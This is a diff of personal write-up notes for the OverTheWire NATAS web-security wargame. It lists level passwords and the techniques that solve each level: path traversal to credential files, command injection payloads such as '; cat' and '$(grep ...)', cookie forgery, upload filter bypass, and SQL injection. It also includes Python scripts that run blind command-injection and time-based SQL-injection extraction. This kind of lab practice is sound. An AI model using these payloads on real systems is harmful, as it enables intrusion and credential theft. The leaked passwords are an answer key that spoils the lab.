@@ -1,19 +1,19 @@
 NATAS-Over The Wire
 ===================
 
-level-1:
+level-0:
 -------
 password: gtVrDuiDfck831PqWsLEZy5gyDz1clto 
 
 solution: look the page source
 
-level-2:
+level-1:
 --------
 password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
 
 solution: looking athe pagesource,right-clicking is blocked so we have to use ctrl+u key combination to view page-source 
 
-level-3:
+level-2:
 --------
 password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
 
@@ -21,48 +21,48 @@ password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
 solution: looking trough the page source we find a image link ``files/pixel.png`` ,when we look at the ``/files`` dir-listing is enabled 	there is user.txt and you can find the password inside that file 
 
 
-level-4:
+level-3:
 --------
 password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
 
 solution: look at the robots.txt you can find ``/s3cr3t/`` when we go to that we can see a user.txt and we can see the password inside that file
 
 	
-level-5:
+level-4:
 -------
 password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 
 
 solution: we have to change the Referer header to ``http://natas5.natas.labs.overthewire.org/``
 
-level-6:
+level-5:
 --------
 password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
 
 solution: we want to change the cookiee "loggedin" from 0 to 1.
 
 
-level-7:
+level-6:
 --------
 
 password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 
 
 solution: here we want to pass the correct secret,by looing into the "view sourcecode" we can see the php source-code and in that it is including ``includes/secret.inc`` to the page so i browsed to that page and in the source of the page we can find the secret
 	
-level-8:
+level-7:
 -------
 
 password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 
 
 solution: LFI,pyaload to the page parameter ``/../../../etc/natas_webpass/natas8``
 
-level-9:
+level-8:
 -------
 
 password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 
 
 solution: looking through the source of the page our input is passed to a ``encodeSecret`` function and it compares to a string in the code so we just have to reverse the function , take that string and then do hex2bin() and then strrrev() and then base64_decode(), and we will get the serect
 	
-level-10:
+level-9:
 -------
 
 password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
@@ -74,7 +74,7 @@ payload:
 ; cat /../../../etc/natas_webpass/natas10
 ```
 	
-level-11:
+level-10:
 -------
 
 password:  U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
@@ -83,7 +83,7 @@ solution: here there are some fileter so we cannot directly inject commands,so w
 
 payload: ``.* ../../../../etc/natas_webpass/natas11``
 
-level-12:
+level-11:
 -------
 
 password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
@@ -92,7 +92,7 @@ solution: when we view the php  source code of the page ,it xor encrypting the j
 
 final payload: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK(set this as the data cookie value)
 
-level-13:
+level-12:
 -------
 
 password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY 
@@ -105,14 +105,14 @@ final php code:
 ```
 
 
-level-14:
+level-13:
 -------
 
 password:  Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
 
 solution:  here it cheks for an image type so we can add some magic bytes of the jpeg files to pass that check 
 	
-level-15:
+level-14:
 -------
 
 password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
@@ -121,7 +121,7 @@ solution: sql injection
 
 payload :   ``" or 1=1 --+``(put it in the input feild)
 	
-level-16:
+level-15:
 -------
 password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
 
@@ -157,19 +157,78 @@ print(password)
 
 ```
 
+level-16:
+-------
+
+password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+solution: 
+```python
+#!/usr/bin/python3
+import requests
+import string
+
+req=requests.Session()
+auth={'Authorization' :'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='}
+url='http://natas16.natas.labs.overthewire.org/index.php'
+req.headers.update(auth)
+payload='?needle=bells$(grep ^{} /etc/natas_webpass/natas17 )&submit=Search'
+chars='bcdghkmnqrswAGHNPQSW035789'
+password=''
+
+for j in range(33):
+	for i in chars:
+		a=password+i
+		p=payload.format(a)
+		u=url+p
+		r=req.get(u)
+		if 'bells' not in r.text:
+			password+=i
+			print(password)
+			break
+			
+```
+
 level-17:
 -------
 
-password:
+password:  xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
 
-solution:
+solution: 
+```python
+#!/usr/bin/python3
 
-level-18:
--------
+import requests
+import string
 
-password:  
 
-solution:  	
+req=requests.Session()
+url='http://natas17.natas.labs.overthewire.org/index.php'
+auth={'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='}
+req.headers.update(auth)
+r=req.post(url,headers=auth)
+p="natas18\" and ord(substr(password,{},1))={} and sleep(2) #"
+chrs=string.ascii_letters+string.digits
+password=''
+for j in range(1,33):
+    for i in chrs:
+        i=ord(i)
+        payload=p.format(j,i)
+        print(payload)
+        data={"username":payload}
+        r1=req.post(url,data=data)
+        time=r1.elapsed.seconds
+        if time==2:
+            print(j,chr(i))
+            password+=chr(i)
+            break
+
+
+
+
+print(password)
+
+```
 	
 	
 	
